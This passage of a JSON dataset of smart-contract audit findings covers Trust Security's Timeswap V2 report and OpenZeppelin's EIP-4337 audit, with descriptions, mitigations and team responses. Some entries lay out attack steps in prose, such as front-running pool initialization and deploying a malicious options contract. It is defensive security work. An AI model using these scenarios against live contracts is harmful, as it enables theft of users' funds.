      "content": "**Description:**\nTimeswapV2LiquidityToken and TimeswapV2Token implement the ERC1155 metadata\nextension, however they incorrectly set the URIs. As per the ERC1155 specification:\nThe URI MUST point to a JSON file that conformsto the \"ERC-1155 Metadata URI JSON\nSchema”.\nIncorrectly-set URIs will affect off-chain integrations with the tokens that will try to read\ntokens’ metadata and fail.\n\n**Recommended Mitigation:**\nConsider correctly setting the URIs in TimeswapV2LiquidityToken and TimeswapV2Token.\nAlternatively, consider not implementing the metadata extension since it’s optional (this\nwould require copying the ERC1155 implementation from OpenZeppelin and removing the\nmetadata extension implementation; also, the IERC1155MetadataURI interface selector\nshould be removed from supported interfaces).\n\n**Team Response:**\nThe issue was fixed as is suggested in this commit: commit.(https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/pull/483/commits/946eb502e3373b6339009121c1ca5f8d57be73ff)\n\n**Mitigation review:**\nTimeswapV2LiquidityToken and TimeswapV2Token were updated as per the\nrecommendation: the contracts set a metadata URI in their constructors.",
      "summary": "\nThis bug report is about the incorrect setting of URIs in two tokens, TimeswapV2LiquidityToken and TimeswapV2Token, that implement the ERC1155 metadata extension. As per the ERC1155 specification, the URIs must point to a JSON file that conforms to the \"ERC-1155 Metadata URI JSON Schema\". This incorrect setting of URIs will affect off-chain integrations with the tokens that will try to read tokens' metadata and fail. The recommended mitigation was to consider correctly setting the URIs in the two tokens or alternatively, to not implement the metadata extension. The team response was that the issue was fixed as suggested in a commit. The mitigation review was that TimeswapV2LiquidityToken and TimeswapV2Token were updated as per the recommendation, setting a metadata URI in their constructors.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20276",
      "title": "TRST-M-2 TimeswapV2PoolFactory allows creation of pools with non-standard option contracts",
      "impact": "MEDIUM",
      "content": "**Description:**\nThe `TimeswapV2PoolFactory.create()` function doesn’t check that the provided options\ncontract was created via the official TimeswapV2OptionFactory. This allows creation of official\npools (i.e. pools created via the official TimeswapV2PoolFactory) with non-official underlying\noptions contracts. Since option contracts accept and store user funds, this poses a severe risk\nfor users who interact with Timeswap pools.\n\nA malicious actor can:\n1) deploy a malicious TimeswapV2Option contract that sends all funds to the malicious actor\nafter maturity;\n2) create a pool for the malicious options contract using the official Timeswap pool factory;\n3) trick users into using the pool to provide liquidity and lend and borrow options.\nUsers will trust the pool because it’ll be created via the official factory.\n\n**Recommended Mitigation:**\nConsider reworking the `TimeswapV2PoolFactory.create()` function to take a pair of token\naddresses instead of an options contract address. Having token addresses, the function can\nget an options contract address from the official TimeswapV2OptionFactory deployment.\n\n**Team Response:**\nHas been identified and fixed here: commit (https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/commit/e32cf3697691c20be327978b50947c0172cb2240)\n\n**Mitigation review:**\nTimeswapV2PoolFactory.create() was updated as per the recommendation.",
      "summary": "\nA bug was identified in the `TimeswapV2PoolFactory.create()` function, which did not check that the provided options contract was created via the official TimeswapV2OptionFactory. This posed a severe risk for users who interacted with Timeswap pools, as malicious actors could deploy malicious TimeswapV2Option contracts that would send all funds to the malicious actor after maturity, and create a pool for the malicious options contract using the official Timeswap pool factory. To mitigate this issue, the `TimeswapV2PoolFactory.create()` function was updated to take a pair of token addresses instead of an options contract address, allowing it to get an options contract address from the official TimeswapV2OptionFactory deployment. The bug has been identified and fixed, and a mitigation review was conducted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20275",
      "title": "TRST-M-1 Short token amounts rounding can result in a revert when burning options",
      "impact": "MEDIUM",
      "content": "**Description:**\nIn `OptionLibrary.mint()`, when computing the amount of shorts in a GivenTokensAndLongs\ntransaction, the \"round up\" flag is set to **false**, but, during burning in `OptionLibrary.burn()`, it's\nset to **true**. This can result in a reverted transaction when burning all previously minted tokens\nusing a GivenTokensAndLongs transaction: the rounding in `OptionLibrary.burn()` will increase\nthe amount of short tokens to burn by 1, which will result in an \"Arithmetic over/underflow\"\nerror. In such situations, to burn their tokens users will have to use the GivenShorts\ntransaction type, which requires extra calculations.\n\n\n**Recommended Mitigation:**\nConsider using consistent rounding when computing the amount of short tokens from\namounts of long tokens via `StrikeConversion.combine()`. In the current implementation,\n`OptionLibrary.burn()`, `OptionLibrary.totalPosition()`, and `OptionLibrary.collect()` round up, but\nOptionLibrary.mint() rounds down.\n\n**Team Response:**\n\"After deliberation we have arrived at the conclusion that this roundUp/roundDown issue\nmentioned is to documented.\nUnfortunately cannot roundUp during the mint.\nAs a workaround the same library StrikeConversion may be utilized in calculating the input for\nthe burn transaction, instead of taking the output from the mint transaction, this is currently\nbeing followed in our peripheries.\nThis would resultin the userlosing about 1 unit position, thisis a limitation of the workaround.\"\n\n**Mitigation review:**\nIn packages/v2-pool/README.md, a note was added:\nThe contracts like most others roundUp/roundDown calculations, which may\naccount for some minor loss from rounding. Eg: When minting using\ngivenTokensAndLong and burning using givenTokensAndLong using given,\nthe total short that one can burn might be 1 less than the actual short position\nowned. This maybe mitigated by using the same library as the one pool uses\nwhile calculating the long amount required for the short position amount.\nThe issue remains valid and cannot be fully fixed because burning of option tokens is\nimplemented as redeeming of short options with a conversion of short options to long\noptions. The amount of short options is rounded up when the GivenTokensAndLongs\ntransaction type is used, which forces users to provide +1 short options and burn -1 long\noptions. Thus, the GivenTokensAndLongs transaction type cannot be seemed as an exact\ninput one when burning all short/long tokens of an address.\nA possible fix would be to remove the GivenTokensAndLongs branch in `OptionLibrary.mint()`.",
      "summary": "\nThis bug report is about an issue in the OptionLibrary.mint() function, where the 'round up' flag is set to false when computing the amount of shorts in a GivenTokensAndLongs transaction, but is set to true when burning in OptionLibrary.burn(). This can result in a reverted transaction when burning all previously minted tokens using a GivenTokensAndLongs transaction, as the rounding in OptionLibrary.burn() will increase the amount of short tokens to burn by 1, resulting in an \"Arithmetic over/underflow\" error. In such situations, users must use the GivenShorts transaction type, which requires extra calculations.\n\nThe team response was that the roundUp/roundDown issue is to be documented, and that users may utilize the same library StrikeConversion in calculating the input for the burn transaction, instead of taking the output from the mint transaction. This would result in the user losing about 1 unit position, which is a limitation of the workaround.\n\nThe mitigation review included a note being added to packages/v2-pool/README.md, which explains that the contracts roundUp/roundDown calculations may account for some minor loss from rounding. It also suggests a possible fix, which is to remove the GivenTokensAndLongs branch in OptionLibrary.mint().",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20274",
      "title": "TRST-H-2 Pool initialization can be front-ran to manipulate the interest rate",
      "impact": "HIGH",
      "content": "**Description:**\nA pool can be permissionlessly initialized multiple times, each time setting a different interest\nrate. An interest rate can be set by either a liquidity provider or a malicious actor. When a\nliquidity provider creates a new pool, they send two transactions:\n1. In the first transaction, they initialize the pool and set an interest rate.\n2. In the second transaction, they add liquidity to the pool. Pools with a positive liquidity\ncannot have their interest rate changed via initialization.\nA malicious actor can sandwich the second transaction to:\n1. Initialize the pool with a higher interest rate.\n2. Force the liquidity provider to provide liquidity at the increased interest rate (i.e. at an\nincreased APR).\n3. Lend long tokens to the pool at the increased rate to get more short tokens. The short\ntokens can be converted to assets after maturity and claimed for underlying assets.\nThis kind of attacks is economically reasonable for attackers because it’s liquidity providers\nwho pay interest to lenders. However, liquidity providers won’t get compensated because no\nborrowers will be interested in borrowing tokens at an increased interest rate. Thus, a\nmalicious lender can set a higher interest rate and force a liquidity provider to give the lender\nmore short tokens. In the opposite direction, borrowers may also manipulate the initial\ninterest rate to borrow option tokens from a LP at a low rate.\nMoreover, this kind of attack is feasible because liquidity providers will always have enough\nshort tokens:the common scenario is when liquidity providers have leftovershorttokens after\nproviding liquidity. By manipulating the interest rate, those leftover tokens can be instead\ndeposited as liquidity and “bought” by lenders at a manipulated rate. In the worst-case\nscenario, all leftover option tokens of a liquidity provider can be “bought” by lenders or\nborrowers.\n\n**Recommended Mitigation:**\nConsider reworking the initialization of a pool so that a liquidity provider can always provide\ninitial liquidity at a chosen interest rate. This may require adding the initial interest rate as a\nkey to the TimeswapV2Pool.pool mapping, so that each pool is identified by a strike price, a\nmaturity date, and an initial interest rate.\n\n**Team Response:**\n\"This may be mitigated by making a multicall to both initialise and addLiquidity at the same\ntime. We currently utilise the same while creating a new pool.\"\n\n**Mitigation review:**\nIn packages/v2-pool/README.md, a note was added:\n\"It is recommended to call initialize and mint for the initial liquidity addition\nin a single multicall as otherwise it is possible for a malicious actor to\nsandwich the transactions.\"\nThe issue remains valid when a multicall contract is not used. Some alternative fixes are\nproposed:\n1. Validation check in `TimeswapV2Pool.initialize()` that sqrtInterestRate() is only within\na valid range. The valid range may be 1% to 1000% APR or whichever the dev team\nthinks is a reasonable upper-bound.\n2. `TimeswapV2Pool.mint()` should also require a minimum amount of initial liquidity\nminted to make front-running to set the `sqrtInterestRate()` prohibitively expensive.",
      "summary": "\nThis bug report describes an attack in which a malicious actor can manipulate the interest rate of a pool when a liquidity provider is adding liquidity. The malicious actor can sandwich the second transaction to set a higher interest rate, and then lend long tokens to the pool at the increased rate to get more short tokens. This is economically reasonable for the attacker because liquidity providers pay interest to lenders, and they won't be compensated if no one is interested in borrowing tokens at the increased rate. \n\nThe recommended mitigation is to rework the initialization of a pool so that a liquidity provider can always provide initial liquidity at a chosen interest rate. The team response is to use a multicall to both initialize and addLiquidity at the same time. The mitigation review includes adding a note in packages/v2-pool/README.md, validating the sqrtInterestRate() is only within a valid range, and requiring a minimum amount of initial liquidity minted in `TimeswapV2Pool.mint()`. \n\nThis bug report serves as a reminder to developers that malicious actors can exploit vulnerabilities in smart contracts to manipulate interest rates and gain more tokens. To prevent this, developers should use a multicall to both initialize and addLiquidity at the same time, as well as validate the sqrtInterestRate() is only within a valid range and require a minimum amount of initial liquidity minted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "20273",
      "title": "TRST-H-1 First liquidity provider receives increased returned shorts due to increased duration",
      "impact": "HIGH",
      "content": "**Description:**\nWhen updating duration weight, pool’s **lastTimestamp** is initially set to 0. During the first call\nto `PoolLibrary.updateDurationWeightBeforeMaturity()`, the amount of returned shorts will be\ncalculated based on a duration starting at the start of the Unix epoch (January 1, 1970). As a\nresult, the first liquidity provider’s position will accumulate 53+ years of short tokens, which\nwill let the liquidity provider claim more returned shorts than expected–the excess amount\nwill be subtracted from the returned shorts of other liquidity providers. In other words, first\nliquidity provider will be able to claim other liquidity providers’ shorts.\nThe vulnerability can be exploited by any first liquidity provider in a pool. On the first deposit,\n`PoolLibrary.mint()` will not update duration weight since pool’s liquidity will be 0; however,\npool’s **lastTimestamp** will be initialized at 0 (the default value of uint256). The position’s\n**shortReturnedGrowth** will be set to 0 since the pool won’t accumulate any returned shorts\nby this time. Any other deposit of liquidity will trigger a call to\n`PoolLibrary.updateDurationWeightBeforeMaturity()`, which will accrue returned shorts for a\nduration computed as **block.timestamp** - 0, resulting in an increased value of\n**shortReturnedGrowth**. As a result, the first liquidity provider’s position will accumulate\nincreased shorts, while other liquidity providers’ positions will accumulate correct amounts.\n\n**Recommended Mitigation:**\nWhen adding initial liquidity to a pool, consider setting pool’s **lastTimestamp** to\n**block.timestamp**. Additionally, ensure that pool’s **lastTimestamp** is handled correctly when\nremoving and re-adding the entire liquidity of a pool.\n\n**Team response:**\nThis issue has been fixed as was suggested, in the commit linked here (https://github.com/Timeswap-Labs/Timeswap-V2-Monorepo/commit/cfbae00d6af384ea9b2f477ba7cecc1ff4f3009a)\n\n**Mitigation review:**\nFixed as per the recommendation: **pool.lastTimestamp** is set to the current block timestamp\nwhen liquidity is minted in a pool with 0 liquidity.",
      "summary": "\nThis bug report is about a vulnerability in the PoolLibrary.updateDurationWeightBeforeMaturity() feature of the Timeswap-V2-Monorepo code. When updating duration weight, pool’s lastTimestamp is initially set to 0, which results in the first liquidity provider’s position accumulating 53+ years of short tokens. This allows the first liquidity provider to claim more returned shorts than expected, which will be subtracted from the returned shorts of other liquidity providers.\n\nThe team has fixed the issue by setting pool.lastTimestamp to the current block timestamp when liquidity is minted in a pool with 0 liquidity. This was suggested as a recommended mitigation and has been confirmed to fix the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Trust Security",
      "protocol_name": "Timeswap",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Trust Security/2023-05-15-Timeswap.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Trust Security"
      ]
    },
    {
      "id": "10349",
      "title": "Unsafe ABI encoding",
      "impact": "LOW",
      "content": "It is not an uncommon practice to use `abi.encodeWithSignature` or `abi.encodeWithSelector` to generate calldata for a low-level call. However, the first option is not safe from typographical errors, and the second option is not type-safe. The result is that both of these methods are error-prone and should be considered unsafe.\n\n\nWithin [`EIP4337Manager.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol), there are some occurrences of unsafe ABI encodings being used:\n\n\n* On [line 119](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol#L119)\n* On [line 144](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol#L144)\n\n\nConsider replacing all occurrences of unsafe ABI encodings with `abi.encodeCall`, which checks whether the supplied values actually match the types expected by the called function, and also avoids typographical errors.\n\n\nNote that a [bug](https://blog.soliditylang.org/2022/03/16/encodecall-bug/) related to the use of string literals as inputs to `abi.encodeCall` was fixed in version 0.8.13, so developers should exercise caution when using this function with earlier versions of Solidity.\n\n\n***Update:** Resolved in [pull request #220](https://github.com/eth-infinitism/account-abstraction/pull/220) and merged at commit [`c0a69bf`](https://github.com/eth-infinitism/account-abstraction/commit/c0a69bf34077e461f12e4d7e2146b52e7b59553b). The first example is an invalid recommendation because it is encoding an error.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10348",
      "title": "Unrestrained revert reason [core]",
      "impact": "LOW",
      "content": "The `EntryPoint` contract can emit a [`FailedOp` error](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IEntryPoint.sol#L63) where the `reason` parameter provides additional context for troubleshooting purposes. However, there are two locations ([line 375](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L375) and [line 417](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L417)) where an untrusted contract can provide the reason, potentially including misleading error codes. For example, the sender `validateUserOp` function might revert with `\"AA90 invalid beneficiary\"`, which might cause confusion during simulation.\n\n\nConsider prefixing the externally provided revert reasons with a uniquely identifying error code.\n\n\n***Update:** Resolved in [pull request #200](https://github.com/eth-infinitism/account-abstraction/pull/200) and merged at commit [`3d8f450`](https://github.com/eth-infinitism/account-abstraction/commit/3d8f4508b23d712859d08aa848d6fc729c2761ad).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10347",
      "title": "Uninitialized implementation contract [samples]",
      "impact": "LOW",
      "content": "The `SimpleAccountFactory` [creates a new implementation contract](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccountFactory.sol#L19) but does not [initialize it](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L80). This means that anyone can initialize the implementation contract to become its owner.\n\n\nThe consequences depend on the version of OpenZeppelin contracts in use. The project [requires release 4.2](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/package.json#L57) and later, but [release 4.8](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/yarn.lock#L804) is locked. The `onlyProxy` modifier was introduced in release 4.3.2 to protect the upgrade mechanism. Without this modifier, the owner is [authorized](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L151) to call the upgrade functions on the implementation contract directly, [which lets them `selfdestruct` it](https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680).\n\n\nWith the locked version, the implementation owner can [execute arbitrary calls](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L56-L73) from the implementation contract, but should not be able to interfere with the operation of the proxies.\n\n\nNevertheless, to reduce the attack surface, consider restricting the versions of OpenZeppelin contracts that are supported and [disabling the initializer](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.8.0/contracts/proxy/utils/Initializable.sol#L144) in the constructor of the `SimpleAccount` contract, to prevent anyone from claiming ownership.\n\n\n***Update:** Resolved in [pull request #201](https://github.com/eth-infinitism/account-abstraction/pull/201) and merged at commit [`4004ebf`](https://github.com/eth-infinitism/account-abstraction/commit/4004ebf1fa615c94801605f042a20d7cf1146fee).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10346",
      "title": "Missing recommended function [samples]",
      "impact": "LOW",
      "content": "The EIP [states](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/eip/EIPS/eip-4337.md?plain=1#L149-L150) that an aggregated account should support the `getAggregationInfo` function, and that this function should return the account’s public key, and possibly other data. However, the [`BLSAccount`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol) contract does not contain a `getAggregationInfo` function. Consider renaming [the `getBlsPublicKey` function](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L48) to `getAggregationInfo`.\n\n\n***Update:** Resolved in [pull request #199](https://github.com/eth-infinitism/account-abstraction/pull/199) and merged at commit [`12d2ac0`](https://github.com/eth-infinitism/account-abstraction/commit/12d2ac0326ce87d7b58a9c57e0e73d1717023ef9). The EIP now uses the `getBlsPublicKey` function as an example.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10345",
      "title": "Missing error messages in require statements [core and samples]",
      "impact": "LOW",
      "content": "Within the [codebase](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/) there are some `require` statements that lack error messages:\n\n\n* The `require` statement on [line 105](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol#L105) of [`BasePaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol)\n* The `require` statement on [line 49](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/DepositPaymaster.sol#L49) of [`DepositPaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/DepositPaymaster.sol)\n* The `require` statement on [line 137](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L137) of [`SimpleAccount.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol)\n\n\nConsider including specific, informative error messages in `require` statements to improve overall code clarity and facilitate troubleshooting whenever a requirement is not satisfied.\n\n\n***Update:** Resolved in [pull request #198](https://github.com/eth-infinitism/account-abstraction/pull/198) and merged at commit [`182b7d3`](https://github.com/eth-infinitism/account-abstraction/commit/182b7d3387a12d2d96974dbb883ed4c15f573122). Error messages were added to the deficient `require` statements in `BasePaymaster.sol` and `DepositPaymaster.sol`, and the `require` statement in `SimpleAccount.sol` was eliminated as part of a code change.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10344",
      "title": "Missing docstrings [core and samples]",
      "impact": "LOW",
      "content": "Throughout the [codebase](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/) there are several parts that do not have docstrings. For instance:\n\n\n* [Line 24](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L23-L24) in [`BLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)\n* [Line 39](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L38-L39) in [`BLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)\n* [Line 44](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L43-L44) in [`BLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)\n* [Line 48](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol#L47-L48) in [`BLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccount.sol)\n* [Line 20](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L19-L20) in [`BLSSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol)\n* [Line 48](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L46-L48) in [`BLSSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol)\n* [Line 106](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L105-L106) in [`BLSSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol)\n* [Line 10](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/IBLSAccount.sol#L10) in [`IBLSAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/IBLSAccount.sol)\n* [Line 24](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol#L23-L24) in [`BasePaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol)\n* [Line 29](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol#L27-L29) in [`BasePaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol)\n* [Line 31](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol#L30-L31) in [`BasePaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BasePaymaster.sol)\n* [Line 167](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L166-L167) in [`EntryPoint.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol)\n* [Line 18](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/StakeManager.sol#L17-L18) in [`StakeManager.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/StakeManager.sol)\n* [Line 11](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Fallback.sol#L10-L11) in [`EIP4337Fallback.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Fallback.sol)\n* [Line 23](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/GnosisAccountFactory.sol#L22-L23) in [`GnosisAccountFactory.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/GnosisAccountFactory.sol)\n* [Line 67](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L66-L67) in [`IStakeManager.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol)\n* [Line 34](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/UserOperation.sol#L33-L34) in [`UserOperation.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/UserOperation.sol)\n* [Line 73](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/DepositPaymaster.sol#L72-L73) in [`DepositPaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/DepositPaymaster.sol)\n* [Line 27](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L26-L27) in [`SimpleAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol)\n* [Line 31](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L30-L31) in 